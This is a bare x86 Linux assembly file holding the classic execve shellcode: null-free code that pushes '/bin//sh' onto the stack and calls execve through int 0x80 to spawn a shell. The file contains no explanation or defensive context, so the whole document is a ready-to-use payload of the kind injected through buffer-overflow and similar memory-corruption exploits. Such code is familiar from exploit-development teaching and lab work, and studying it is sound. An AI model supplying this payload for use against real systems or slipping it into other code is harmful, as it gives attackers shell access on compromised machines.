section .text
global _start

_start:
    xor eax, eax
    push eax
    push 0x68732f2f ; //sh
    push 0x6e69622f ; /bin
    mov ebx, esp
    push eax
    mov ecx, eax
    mov edx, eax
    mov al, 0xb    ; syscall execve
    int 0x80

